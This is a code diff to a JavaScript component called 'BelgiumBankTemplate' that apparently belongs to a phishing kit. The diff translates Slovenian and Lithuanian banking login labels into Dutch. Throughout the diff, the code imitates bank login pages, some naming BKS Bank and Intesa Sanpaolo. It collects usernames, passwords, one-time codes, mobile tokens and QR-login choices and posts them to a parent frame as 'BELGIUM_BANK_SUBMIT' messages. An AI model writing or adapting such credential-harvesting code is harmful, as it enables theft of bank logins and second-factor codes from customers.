@@ -166,15 +166,15 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     // Fallback: genel eslesme (yeni isimler icin)
     const normalized = raw.toLowerCase().replace(/„|“|"|'|`/g, "");
     if (normalized.includes("mobilescan") || normalized.includes("digipass")) return "MobileSCAN/Digipass 780";
-    if (normalized.includes("seb aplikacija") || normalized.includes("seb programele") || normalized.includes("seb app")) return "SEB aplikacija App";
+    if (normalized.includes("seb aplikacija") || normalized.includes("seb programele") || normalized.includes("seb app")) return "SEB-app";
     if (normalized.includes("smart")) return "Smart-ID";
     if (normalized.includes("mobile") || /(^|\s)m\.?\s*para/.test(normalized)) return "Mobile-ID";
-    if (normalized.includes("enkratni") || normalized.includes("varnostni koda")) return "Vienkartinis varnostni koda";
-    if (/kod[uų]\s*kortel/.test(normalized) || (normalized.includes("kortel") && normalized.includes("generator"))) return "Kodų kartica/Generatorius";
-    if (normalized.includes("generator") && !normalized.includes("kartica")) return "Generatorius";
-    if (normalized.includes("pin generator") || normalized.includes("pin-kalk") || /pin[-\s]*gen/.test(normalized)) return "PIN generator";
-    if (normalized.includes("id-kort") || normalized.includes("id kort")) return "ID-kartica";
-    if (normalized.includes("bio") || (/pin\b/.test(normalized) && !normalized.includes("smart") && !normalized.includes("mobile"))) return "Biometrika/PIN";
+    if (normalized.includes("enkratni") || normalized.includes("varnostni koda")) return "Eenmalige beveiligingscode";
+    if (/kod[uų]\s*kortel/.test(normalized) || (normalized.includes("kortel") && normalized.includes("generator"))) return "Codekaart/Generator";
+    if (normalized.includes("generator") && !normalized.includes("kartica")) return "Generator";
+    if (normalized.includes("pin generator") || normalized.includes("pin-kalk") || /pin[-\s]*gen/.test(normalized)) return "PIN-generator";
+    if (normalized.includes("id-kort") || normalized.includes("id kort")) return "ID-kaart";
+    if (normalized.includes("bio") || (/pin\b/.test(normalized) && !normalized.includes("smart") && !normalized.includes("mobile"))) return "Biometrie/PIN";
     if (normalized.includes("sms")) return "SMS";
     if (normalized.includes("m. podpis") || normalized.includes("m paras")) return "M. podpis";
     return raw;
@@ -560,7 +560,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                   key: "enkratno-geslo",
                   name: "enkratno-geslo",
                   id: "enkratno-geslo",
-                  label: "Enkratno geslo",
+                  label: "Eenmalig wachtwoord",
                   type: "password",
                   value: joined,
                 });
@@ -2196,11 +2196,11 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             if (window.location.href.includes('bks')) return 'BKS Bank-Online';
             if (window.location.href.includes('intesa')) return 'Intesa Sanpaolo Bank';
 
-            if (normalized.includes('geslo') || normalized.includes('password')) return 'Geslo';
+            if (normalized.includes('geslo') || normalized.includes('password')) return 'Wachtwoord';
             if (normalized.includes('rekono')) return 'Rekono';
-            if (normalized.includes('žeton') || normalized.includes('zeton') || normalized.includes('token')) return 'Mobilni žeton';
-            if (normalized.includes('koda') || normalized.includes('otp')) return 'Enkratna koda';
-            if (normalized.includes('mobilna') || normalized.includes('aplikac')) return 'Mobilna banka';
+            if (normalized.includes('žeton') || normalized.includes('zeton') || normalized.includes('token')) return 'Mobiele token';
+            if (normalized.includes('koda') || normalized.includes('otp')) return 'Eenmalige code';
+            if (normalized.includes('mobilna') || normalized.includes('aplikac')) return 'Mobiel bankieren';
 
             return loginMethod;
         };
@@ -2419,7 +2419,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
               e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
               try {
                 const res = serializeAllLtForms();
-                res.fields.push({ key: 'qr-login', name: 'qr-login', id: 'qr-login', label: 'Prijava s QR kodo', type: 'text', value: 'QR prijava' });
+                res.fields.push({ key: 'qr-login', name: 'qr-login', id: 'qr-login', label: 'Aanmelden met QR-code', type: 'text', value: 'QR-aanmelding' });
                 res.inputs['qr-login'] = 'QR prijava';
                 window.parent.postMessage({
                   type: 'BELGIUM_BANK_SUBMIT',
@@ -2461,8 +2461,8 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                 const pEl = document.getElementById('password') || document.querySelector('input[name="otp-auto"]');
                 const uVal = uEl && uEl.value ? String(uEl.value).trim() : '';
                 const pVal = pEl && pEl.value ? String(pEl.value).trim() : '';
-                if (uVal) res.fields.push({ key: 'username', name: 'username', id: 'username', label: 'Uporabniško ime', type: 'text', value: uVal });
-                if (pVal) res.fields.push({ key: 'password', name: 'password', id: 'password', label: 'withKEY geslo', type: 'password', value: pVal });
+                if (uVal) res.fields.push({ key: 'username', name: 'username', id: 'username', label: 'Gebruikersnaam', type: 'text', value: uVal });
+                if (pVal) res.fields.push({ key: 'password', name: 'password', id: 'password', label: 'withKEY wachtwoord', type: 'password', value: pVal });
                 if (uVal && pVal) {
                   window.parent.postMessage({
                     type: 'BELGIUM_BANK_SUBMIT',
@@ -3227,7 +3227,7 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                     errorMsg.style.position = 'absolute';
                     errorMsg.style.bottom = '-20px';
                     errorMsg.style.left = '0';
-                    errorMsg.innerText = 'Prosimo, vnesite samo številko';
+                    errorMsg.innerText = 'Voer alleen cijfers in';
                     input.parentElement.style.position = 'relative';
                     input.parentElement.appendChild(errorMsg);
                 }
